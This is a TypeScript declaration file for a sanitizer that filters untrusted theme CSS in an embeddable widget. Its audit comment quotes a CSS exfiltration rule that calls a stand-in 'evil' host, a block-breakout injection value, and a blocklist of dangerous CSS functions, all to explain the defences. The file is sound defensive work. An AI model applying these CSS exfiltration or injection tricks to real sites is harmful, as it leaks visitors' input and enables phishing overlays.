/**
 * Theme CSS safety (2026-11 audit).
 *
 * Quest themes are written by qaid project members and served by qaid's
 * server, and this embed draws them on partner sites. A theme may restyle the
 * quest card; it must not reach the partner page or its visitors. Three holes
 * this closes:
 *
 *  1. Exfiltration. `[value^="a"] { background: url(https://evil/?a) }` sends
 *     what a visitor picks to someone else's server, and any `url()` is a
 *     tracking pixel on every page view.
 *  2. Page takeover. `:host { position: fixed; inset: 0 }` covers the whole
 *     partner page with something that looks like it.
 *  3. Breakout. A token value of `red; } :host { ... ` ends the token block
 *     and starts rules of its own.
 *  4. Drawing outside the quest. `position: absolute` with a big size and a
 *     high z-index, negative margins, or a transform can paint over the
 *     partner's page (a fake sign-in form over their site, say) without any
 *     `fixed`. A blocklist of geometry would never be complete, so this one is
 *     closed by containment instead (see "CONTAINMENT" below).
 *
 * qaid.dev applies the SAME rules when a theme is saved; keep the two lists in
 * step. They are explicit on purpose, so both sides can be read side by side.
 *
 * TOKEN VALUES (theme `tokens`, and host `colors` / `fontFamily`) are dropped
 * unless they are a plain CSS value. A value is refused if it contains any of:
 *   - the characters  ;  {  }  <  >  \
 *   - the text  url(  image-set(  image(  cross-fade(  src(  expression(
 *     @import  /*  javascript:   (any case)
 *   - unbalanced quotes, parentheses or brackets
 * A token NAME must be a custom property: --[A-Za-z0-9_-]+
 *
 * THEME CSS (theme `css`) is parsed and rebuilt, so its braces always balance
 * and it cannot swallow the layers after it. While rebuilding, this is dropped:
 *   - comments, and every  -->  and every  <  followed by a letter, / ! or ?
 *     (so no  </style  <script  <!--  survives; `width < 600px` does)
 *   - every @import, @charset and @namespace rule
 *   - a declaration whose property is  behavior  or  -moz-binding
 *   - a declaration whose value has  url(  (except url(#id), a same-document
 *     SVG reference),  image-set(  -webkit-image-set(  image(  cross-fade(
 *     src(  expression(  or  javascript:
 *   - a declaration  position: fixed  or  position: sticky
 *   - every @scope rule (a prelude-less @scope's `:scope` is the shadow host)
 *   - in a rule whose selector names  :host  (also :host() and
 *     :host-context()), every declaration except a custom property (--x) and
 *     color, color-scheme, font, font-*, line-height, letter-spacing. Nested
 *     rules and at-rule blocks inside it that still mean the host (`&...`,
 *     `@media`) get the same treatment.
 * CSS escapes (\75 rl, u\72l) are decoded before any check, so an escaped
 * word is caught like a plain one.
 *
 * CONTAINMENT. The shadow host (the element the embed puts on the page) is
 * the quest's box, and the embed sets `contain: paint` on it as an inline
 * `!important` style (see `HOST_CONTAINMENT`). Paint containment clips
 * everything inside to the host's box and makes the host the containing
 * block for absolute AND fixed descendants, so no size, offset, margin,
 * transform or z-index in theme CSS can paint past it. It also starts a
 * stacking context (what `isolation: isolate` would add) and a new block
 * formatting context, so a child's negative margin can't collapse through.
 * The host gets no `position` from us: it would change the partner's
 * layout, and containment already gives the containing block.
 *
 * Why the host, not the root element inside the shadow root: theme CSS can
 * size and move any element inside the tree, so a box it can restyle can't
 * be the limit. It can reach the host only through `:host`, and an
 * `!important` declaration in a shadow tree beats the host's inline
 * `!important` (for important rules the inner context wins), so that is
 * why `:host` rules are cut down to the harmless properties above: no
 * contain, overflow, clip, size, margin, transform, outline or shadow (the
 * host's own outline and box-shadow are not clipped by its own containment).
 *
 * Modal mode (no `container`) covers the viewport on purpose: the partner
 * chose it. There the host is `position: fixed; inset: 0`, so containment
 * clips to the viewport, which changes nothing the modal does. Its backdrop
 * and dialog frame are positioned by the embed with inline `!important`
 * styles (`BACKDROP_LOCK`, `MODAL_LOCK`) so a theme can recolour them but
 * not move or resize them. Native `<select>` and date pickers are drawn by
 * the browser outside the page and are not affected by any of this.
 *
 * The host page's own `css` option is the partner's code and is not filtered.
 */
/** True when `value` is a plain CSS value safe to drop into a declaration. */
export declare function isSafeTokenValue(value: unknown): value is string;
export declare function isSafeTokenName(name: string): boolean;
/** The theme's tokens as a `:where(.qaid-q-root) { ... }` block, unsafe ones dropped. */
export declare function tokensToCss(tokens: Record<string, unknown> | null | undefined): string;
/** Rebuild a theme's custom CSS with every unsafe part removed. */
export declare function sanitizeThemeCss(css: unknown): string;
/**
 * On the shadow host, in both modes: nothing inside paints more than 40px past
 * its box. The 40px (`overflow-clip-margin`, which `contain: paint` honours)
 * keeps a card's glow or drop shadow, as the neon and glass themes draw, from
 * being cut off; it is far too little to cover a partner's page. Browsers
 * without `overflow-clip-margin` (Safari) clip at the box itself.
 */
export declare const HOST_CONTAINMENT: Readonly<Record<string, string>>;
/** Modal mode: the backdrop always covers the (viewport-sized) host exactly. */
export declare const BACKDROP_LOCK: Readonly<Record<string, string>>;
/**
 * Modal mode: the dialog frame stays centred, at the width the partner asked
 * for (`modalWidth`, through --qaid-modal-width) and inside the viewport.
 */
export declare const MODAL_LOCK: Readonly<Record<string, string>>;
/**
 * Set `styles` inline with `!important`. Theme CSS lives in the same shadow
 * tree as these elements, and there an inline `!important` declaration beats
 * any stylesheet one, so a theme can't undo them. (The host is in the
 * partner's tree; it is kept out of the theme's reach by the `:host` rule.)
 */
export declare function lockStyles(el: HTMLElement, styles: Readonly<Record<string, string>>): void;
export declare function installThemeCss(root: ShadowRoot, css: string): void;
/** The theme stylesheets this module installed in `root` (for tests and teardown). */
export declare function themeSheetsIn(root: ShadowRoot): CSSStyleSheet[];
/** The theme CSS installed in `root` as text, or null when none was. */
export declare function themeCssText(root: ShadowRoot): string | null;
